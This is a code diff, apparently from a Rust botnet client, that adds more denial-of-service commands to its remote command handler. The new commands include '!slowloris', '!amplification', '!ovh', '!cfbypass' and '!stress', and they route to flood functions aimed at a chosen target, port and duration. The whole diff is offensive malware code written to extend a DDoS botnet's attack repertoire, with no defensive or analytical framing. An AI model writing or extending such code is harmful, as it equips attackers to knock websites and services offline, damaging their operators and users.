@@ -326,7 +326,10 @@ async fn handle_command(command: &str, state: Arc<BotState>) -> Result<()> {
     // Attack commands
     match cmd {
         "!udpflood" | "!udpsmart" | "!tcpflood" | "!synflood" | 
-        "!ackflood" | "!greflood" | "!dns" | "!http" => {
+        "!ackflood" | "!greflood" | "!dns" | "!http" |
+        "!slowloris" | "!sslflood" | "!websocket" | "!icmpflood" |
+        "!amplification" | "!connection" |
+        "!vse" | "!ovh" | "!cfbypass" | "!stress" => {
             handle_attack_command(cmd, &fields, state).await?;
         }
         
@@ -489,6 +492,22 @@ async fn handle_attack_command(cmd: &str, fields: &[&str], state: Arc<BotState>)
             }
             "!connection" => {
                 attack_methods::connection_exhaustion(&target, port, duration).await;
+                Ok(())
+            }
+            "!vse" => {
+                attack_methods::vse_flood(&target, port, duration).await;
+                Ok(())
+            }
+            "!ovh" => {
+                attack_methods::ovh_flood(&target, port, duration).await;
+                Ok(())
+            }
+            "!cfbypass" => {
+                attack_methods::cf_bypass_flood(&target, port, duration).await;
+                Ok(())
+            }
+            "!stress" => {
+                attack_methods::http_stress(&target, port, duration).await;
                 Ok(())
             }
             _ => {
